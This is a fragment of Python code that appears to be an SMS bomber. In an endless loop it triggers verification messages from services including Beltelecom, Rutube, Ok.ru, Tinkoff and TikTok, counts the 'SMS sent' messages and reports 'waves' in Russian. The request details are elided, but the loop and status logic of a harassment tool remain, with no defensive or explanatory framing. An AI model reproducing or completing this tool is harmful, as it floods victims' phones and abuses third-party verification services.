			...
			while True:
				try:
					...
					if beltelecom.status_code == 200:
						print("\033[32m\033[1m Beltelecom СМС отправлено! \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Beltelecom СМС не отправлено!")
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					...
					if bamboogroup.status_code == 200:
						print("\033[32m\033[1m Bamboogroup СМС отправлено! \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Bamboogroup СМС не отправлено!")
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					...
					if rutube.status_code == 200:
						print("\033[32m\033[1m Rutube СМС отправлено! \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Rutube СМС не отправлено!")
				except:
					error_rqs = 0
				time.sleep(0.3)
				try:
					...
					if ivi.status_code == 200:
						print("\033[32m\033[1m IVI СМС отправлено! \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m IVI СМС не отправлено!")
				...
				try:
					...
					if shopby.status_code == 200:
						print("\033[32m\033[1m Shop.by СМС отправлено! \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Shop.by СМС не отправлено!")
				...
				try:
					...
					if icq.status_code == 200:
						print("\033[32m\033[1m ICQ СМС отправлено! \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m ICQ СМС не отправлено!")
				...
				try:
					...
					if okru.status_code == 200:
						print("\033[32m\033[1m Ok.ru СМС отправлено! \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Ok.ru СМС не отправлено!")
				...
				try:
					...
					if youla.status_code == 200:
						print("\033[32m\033[1m Youla СМС отправлено! \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Youla СМС не отправлено!")
				...
				try:
					...
					if yandex_eda.status_code == 200:
						print("\033[32m\033[1m Yandex Eda СМС отправлено! \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Yandex Eda СМС не отправлено!")
				...
				try:
					...
					if tinkoff.status_code == 200:
						print("\033[32m\033[1m Tinkoff СМС отправлено! \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Tinkoff СМС не отправлено!")
				...
				try:
					...
					if utair.status_code == 200:
						print("\033[32m\033[1m Utair СМС отправлено! \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m Utair СМС не отправлено!")
				...
				try:
					...
					if tiktok.status_code == 200:
						print("\033[32m\033[1m TikTok СМС отправлено! \033[37m[\033[36m"+str(nms)+"\033[37m]\033[0m")
						nms += 1
					else:
						print("\033[31m\033[1m TikTok СМС не отправлено!")
					
				except:
					error_rqs = 0
				print("\033[33mВолна номер \033[36m"+str(nvs)+" \033[33mпройдена!")
				nvs+=1
				time.sleep(2.7)